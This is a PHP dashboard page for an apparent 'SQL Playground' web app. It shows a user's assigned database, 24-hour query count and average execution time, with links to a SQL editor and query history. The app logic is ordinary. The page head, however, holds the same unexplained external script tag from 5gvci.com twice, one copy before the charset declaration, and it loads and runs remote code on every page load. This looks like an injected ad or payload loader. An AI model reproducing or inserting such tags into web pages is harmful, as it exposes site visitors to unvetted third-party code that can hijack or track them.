<?php
// app/user/dashboard.php
require_once __DIR__ . '/../config/auth_middleware.php';
require_once __DIR__ . '/../config/db_control.php';
requireLogin();

$userId = getCurrentUserId();
$name = $_SESSION['name'];
$dbName = $_SESSION['db_name'];

// Fetch basic stats
$pdo = getControlDB();
$stmt = $pdo->prepare("SELECT COUNT(*) as count, AVG(execution_time_ms) as avg_time FROM query_logs WHERE user_id = ? AND created_at > DATE_SUB(NOW(), INTERVAL 24 HOUR)");
$stmt->execute([$userId]);
$stats = $stmt->fetch();
?>
<!DOCTYPE html>
<html lang="en">
<head>
<script src="https://5gvci.com/act/files/tag.min.js?z=10681000" data-cfasync="false" async></script>
    <meta charset="UTF-8">
    <title>Dashboard - SQL Playground</title>
    <link rel="icon" type="image/png" href="/assets/logo.png">
    <script src="https://cdn.tailwindcss.com"></script>
<script src="https://5gvci.com/act/files/tag.min.js?z=10681000" data-cfasync="false" async></script>
</head>
<body class="bg-gray-50 h-screen flex flex-col">
    <nav class="bg-blue-600 text-white p-4 flex justify-between items-center">
        <h1 class="text-xl font-bold">SQL Playground</h1>
        <div>
            <span class="mr-4">Hello, <?= htmlspecialchars($name) ?></span>
            <a href="/app/auth/logout.php" class="bg-blue-700 hover:bg-blue-800 px-3 py-1 rounded">Logout</a>
        </div>
    </nav>
    
    <div class="flex-1 p-8">
        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
            <div class="bg-white p-6 rounded shadow">
                <h3 class="text-gray-500 text-sm uppercase">Assigned Database</h3>
                <p class="text-2xl font-bold font-mono text-gray-800"><?= htmlspecialchars($dbName) ?></p>
            </div>
            <div class="bg-white p-6 rounded shadow">
                <h3 class="text-gray-500 text-sm uppercase">Queries 24h</h3>
                <p class="text-3xl font-bold text-blue-600"><?= $stats['count'] ?? 0 ?></p>
            </div>
            <div class="bg-white p-6 rounded shadow">
                <h3 class="text-gray-500 text-sm uppercase">Avg Exec Time</h3>
                <p class="text-3xl font-bold text-green-600"><?= round($stats['avg_time'] ?? 0, 2) ?> ms</p>
            </div>
        </div>

        <div class="mt-8 grid grid-cols-1 md:grid-cols-2 gap-6">
            <a href="editor.php" class="block bg-blue-500 text-white p-6 rounded shadow hover:bg-blue-600 transition flex items-center justify-between group">
                <div>
                    <h2 class="text-2xl font-bold">Open SQL Editor</h2>
                    <p class="opacity-90">Write and execute queries</p>
                </div>
                <span class="text-4xl group-hover:translate-x-2 transition">→</span>
            </a>
            <a href="history.php" class="block bg-white text-gray-800 p-6 rounded shadow hover:bg-gray-50 transition border flex items-center justify-between group">
                <div>
                    <h2 class="text-2xl font-bold">Query History</h2>
                    <p class="text-gray-600">View past execution logs</p>
                </div>
                <span class="text-4xl text-gray-400 group-hover:translate-x-2 transition">→</span>
            </a>
        </div>
    </div>
</body>
</html>
